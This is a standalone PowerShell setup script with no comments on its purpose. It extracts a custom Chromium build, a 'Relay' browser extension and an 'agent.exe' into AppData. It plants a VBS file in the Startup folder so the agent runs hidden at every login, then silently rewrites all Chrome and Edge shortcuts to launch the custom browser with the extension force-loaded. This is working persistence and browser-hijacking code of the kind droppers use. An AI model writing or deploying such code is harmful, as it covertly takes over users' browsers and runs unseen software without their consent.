# Define paths
$browserPath = Join-Path $env:APPDATA 'Browser'
$serverPath = Join-Path $env:APPDATA 'Server'
$startupFolder = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
$vbsFilePath = Join-Path $startupFolder 'run-agent.vbs'

# Create directories if they don't exist
New-Item -Path $browserPath -ItemType Directory -Force | Out-Null
New-Item -Path $serverPath -ItemType Directory -Force | Out-Null

# Unzip files
Expand-Archive -Path "chrome.zip" -DestinationPath $browserPath -Force
Expand-Archive -Path "relay.zip" -DestinationPath $browserPath -Force
Expand-Archive -Path "agent.zip" -DestinationPath $serverPath -Force

# VBS script content to run agent.exe silently
$vbsContent = @'
Set WshShell = CreateObject("WScript.Shell")
WshShell.Run """" & WScript.CreateObject("WScript.Shell").ExpandEnvironmentStrings("%APPDATA%") & "\Server\agent.exe""", 0, False
'@

# Write VBS to Startup folder
Set-Content -Path $vbsFilePath -Value $vbsContent -Encoding ASCII

Write-Host "Setup complete. Agent will run in the background on next login."


# Define target executable and extension directory
$customChrome = "$env:APPDATA\Browser\chrome-win\chrome.exe"
$extensionDir = "$env:APPDATA\Browser\Relay"

# Locations to scan
$shortcutPaths = @(
    "$env:PUBLIC\Desktop",
    "$env:USERPROFILE\Desktop",
    "$env:APPDATA\Microsoft\Windows\Start Menu\Programs",
    "$env:ProgramData\Microsoft\Windows\Start Menu\Programs"
)

# Create a WScript.Shell COM object
$ws = New-Object -ComObject WScript.Shell

foreach ($path in $shortcutPaths) {
    if (-Not (Test-Path $path)) { continue }

    Get-ChildItem -Path $path -Filter *.lnk -Recurse -ErrorAction SilentlyContinue | ForEach-Object {
        try {
            $shortcut = $ws.CreateShortcut($_.FullName)

            # Check if the shortcut points to Chrome or Edge
            if ($shortcut.TargetPath -match "chrome.exe" -or $shortcut.TargetPath -match "msedge.exe") {
                Write-Host "Modifying shortcut:" $_.FullName
				Write-Host $customChrome
				Write-Host $extensionDir
                # Replace with custom Chromium build
                $shortcut.TargetPath = $customChrome
                $shortcut.Arguments = "--load-extension=`"$extensionDir`""
                $shortcut.Save()
            }
        } catch {
            Write-Warning "Failed to process shortcut: $_.FullName"
        }
    }
}
 